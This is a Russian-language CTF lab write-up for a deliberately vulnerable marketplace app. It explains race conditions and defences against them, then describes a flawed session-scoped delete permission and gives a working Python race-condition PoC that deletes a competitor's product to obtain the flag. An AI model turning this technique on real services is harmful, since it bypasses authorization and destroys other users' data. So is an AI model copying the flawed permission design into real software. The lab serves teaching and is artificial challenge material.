# Lafufu Store — writeup / README

## Race condition

**Race condition** — это уязвимость, тесно связанная с ошибками бизнес-логики приложения. Она возникает тогда, когда сайт обрабатывает несколько запросов одновременно, но не гарантирует корректную синхронизацию доступа к общим данным или состоянию. В результате два или более параллельных запроса могут «столкнуться» и перевести приложение в состояние, которое разработчик не предполагал.

Ключевая идея здесь — наличие так называемого **race window**: очень маленького промежутка времени, в течение которого два запроса ещё успевают повлиять на одни и те же данные до того, как приложение окончательно зафиксирует новое состояние. Это может быть буквально несколько миллисекунд между проверкой условия и записью результата в базу данных. 

Опасность race condition не всегда сводится только к классической схеме «проверил — использовал». Во многих приложениях один HTTP-запрос внутри сервера запускает **скрытую многошаговую последовательность**: приложение входит во временное промежуточное состояние, а затем выходит из него после завершения обработки. Такие временные промежуточные состояния называют **sub-states**. Если второй запрос попадает именно в такой момент, он может обойти ограничения, повторно использовать одноразовое действие или выполнить операцию, на которую у него не должно быть прав. 

Поэтому race condition удобно понимать так:

1. приложение ожидает, что действия происходят последовательно;
2. на практике несколько запросов обрабатываются конкурентно;
3. между этапами обработки появляется временное промежуточное состояние;
4. атакующий специально отправляет запросы почти одновременно, чтобы попасть в это окно и получить нештатный результат.

## Способы защиты от уязвимости

Статья [PortSwigger Race Conditions](https://portswigger.net/web-security/race-conditions) рекомендует не пытаться «поймать» гонку косметическими мерами, а по возможности **устранять сами промежуточные состояния** на чувствительных эндпоинтах. Если один запрос может на время перевести приложение в опасный sub-state, защиту уже трудно считать надёжной. 

Практические способы защиты:

1. **Делать чувствительные операции атомарными**

   Проверка прав, проверка лимита и само изменение состояния должны выполняться как одна логическая операция. Например, вместо «сначала проверить, потом отдельно удалить» лучше выполнять один SQL-запрос или одну транзакцию, в которой состояние проверяется и меняется без промежуточного окна. PortSwigger прямо рекомендует использовать возможности хранилища данных для обеспечения конкурентной безопасности. 

2. **Использовать транзакции, блокировки и механизмы согласованности БД**

   Если над одной и той же записью могут работать несколько запросов, нужно применять транзакции, `SELECT ... FOR UPDATE`, ограничения уникальности, проверки целостности и другие механизмы, которые не дают двум потокам одновременно принять несовместимые решения. PortSwigger отдельно отмечает, что ограничения целостности — важная защита второго уровня. 

3. **Не строить авторизацию на разделяемом промежуточном состоянии**

   В статье отдельно сказано, что нельзя использовать один слой хранения данных для защиты другого. Например, сессии или вспомогательные таблицы плохо подходят для предотвращения limit overrun атак на данные в базе. Если право на операцию хранится отдельно от самой защищаемой сущности, появляется риск, что параллельный запрос использует это состояние не так, как задумывалось. 

4. **Не смешивать данные из разных мест без строгой синхронизации**

   Чем больше в цепочке участвует разных хранилищ или уровней состояния — сессии, кэш, база, фоновые задачи, — тем выше шанс, что между ними появится рассинхронизация. PortSwigger рекомендует по возможности избегать такой архитектуры на критичных участках. 

5. **Обновлять связанное состояние пакетно, а не по частям**

   Если приложение по очереди меняет несколько полей сессии или ORM-объекта, оно может создать короткое, но эксплуатируемое промежуточное состояние. Это особенно опасно в механизмах авторизации, сброса пароля, подтверждения почты и подобных процессах. 

6. **Использовать защиту в глубину, а не один барьер**

   Даже если основная логика кажется корректной, стоит добавлять дополнительные ограничения: уникальные индексы, проверки на уровне БД, одноразовые токены, строгую привязку действия к пользователю и объекту. Если одно звено даст сбой при гонке, второе сможет остановить атаку. Это особенно важно для опасных операций: переводов, удаления данных, подтверждения заказов, смены пароля, применения скидок и т.д.

Главный принцип защиты: **не допускать, чтобы между проверкой и использованием существовало общее временное состояние, доступное другим конкурентным запросам**.

Из корня проекта:

```bash
docker compose up --build
```

```text
https://localhost:8443
```

## Описание уязвимости в приложении

Уязвимость реализована в файле `app/main.py`.

Ключевые функции:

- `grant_temporary_session_permission()`
- `has_temporary_session_permission()`
- `revoke_temporary_session_permission()`
- `authorize_and_grant_session_permission()`
- обработчик `POST /products/{product_id}/delete`

Логика удаления сейчас выглядит так:

1. если временного разрешения нет — приложение проверяет, что текущий пользователь владеет товаром;
2. затем добавляет в таблицу `permissions` запись вида:
   - `cookie = request.cookies["marketplace_session"]`
   - `actions = "delete_products"`
3. после этого код ещё раз проверяет, что разрешение существует;
4. затем выполняет `db.delete(product)`;
5. только в `finally` удаляет временное разрешение.

Проблема здесь в том, что разрешение:

- не связано с конкретным товаром;
- не связано с конкретным пользователем;
- действует для всех параллельных запросов с тем же cookie;
- существует достаточно долго, чтобы другой воркер успел его использовать.

### Сценарий эксплуатации

По заданию пользователю требуется удалить товар конкурента `bear_market`, владея аккаунтом `lafufu_from_china`.

Предположим, атакующий вошёл в аккаунт.

Дальше он отправляет два почти одновременных запроса с одним и тем же session cookie:

- запрос A: удалить **свой** товар;
- запрос B: удалить **чужой** товар `id=6`.

Что происходит:

- запрос A успешно проходит проверку владельца;
- запрос A создаёт запись `delete_products` в таблице `permissions`;
- запрос B попадает в обработчик чуть позже и видит, что разрешение уже существует;
- из-за этого запрос B **пропускает проверку владения** и тоже выполняет удаление;
- если удалён товар `id=6`, приложение возвращает флаг.

То есть фактическая авторизация ломается из-за гонки между двумя запросами.

Дополнительный фактор, который упрощает эксплуатацию: приложение запускается с несколькими воркерами:

```bash
uvicorn app.main:app --host 0.0.0.0 --port 8000 --workers 4
```

Это повышает вероятность того, что два запроса будут реально обработаны параллельно.

## POC-эксплоит для получения флага

Ниже приведён PoC для локального стенда. Он:

1. логинится под существующим пользователем;
2. создаёт несколько временных товаров;
3. для каждого временного товара запускает гонку из двух параллельных запросов:
   - удаление своего временного товара;
   - удаление товара `id=6`;
4. при успехе печатает флаг из ответа сервера.


```python
import concurrent.futures
import re
import uuid
import requests

BASE = "https://localhost:8443"
LOGIN = "lafufu_from_china"
PASSWORD = "all_lafufu_are_from_china"
TARGET_ID = 6
SESSION_COOKIE_NAME = "marketplace_session"

requests.packages.urllib3.disable_warnings()


def login():
    s = requests.Session()
    r = s.post(
        f"{BASE}/login",
        data={"username": LOGIN, "password": PASSWORD},
        verify=False,
        allow_redirects=False,
    )
    if r.status_code not in (302, 303):
        raise RuntimeError("Не удалось войти")

    if SESSION_COOKIE_NAME not in s.cookies:
        raise RuntimeError("Session cookie не получен")

    return s


def create_temp_product(session, idx):
    title = f"race_tmp_{idx}_{uuid.uuid4().hex[:8]}"
    r = session.post(
        f"{BASE}/products",
        data={
            "title": title,
            "description": "temporary product for race exploit",
            "price": "1",
        },
        verify=False,
        allow_redirects=False,
    )
    if r.status_code not in (302, 303):
        raise RuntimeError("Не удалось создать временный товар")

    search = session.get(f"{BASE}/?q={title}", verify=False)
    m = re.search(r'/products/(\d+)', search.text)
    if not m:
        raise RuntimeError("Не удалось найти ID временного товара")

    return int(m.group(1))


def post_delete(product_id, cookies):
    return requests.post(
        f"{BASE}/products/{product_id}/delete",
        cookies=cookies,
        verify=False,
        allow_redirects=False,
    )


def try_race(temp_product_id, cookies):
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as pool:
        fut1 = pool.submit(post_delete, temp_product_id, cookies)
        fut2 = pool.submit(post_delete, TARGET_ID, cookies)
        r1 = fut1.result()
        r2 = fut2.result()

    for r in (r1, r2):
        if "practice{" in r.text:
            return r.text.strip()
    return None


def main():
    session = login()
    cookies = {SESSION_COOKIE_NAME: session.cookies.get(SESSION_COOKIE_NAME)}

    temp_ids = []
    for i in range(200):
        temp_ids.append(create_temp_product(session, i))

    for temp_id in temp_ids:
        flag = try_race(temp_id, cookies)
        if flag:
            print("[+] FLAG:", flag)
            return


if __name__ == "__main__":
    main()
```

### Как использовать PoC

1. Поднимите проект:

```bash
docker compose up --build
```

2. Сохраните код выше, например, как `poc_race.py`.

3. Установите библиотеку `requests`, если она ещё не установлена:

```bash
pip install requests
```

4. Запустите эксплоит:

```bash
python3 poc_race.py
```

Если гонка сработает, в консоль будет выведен флаг.
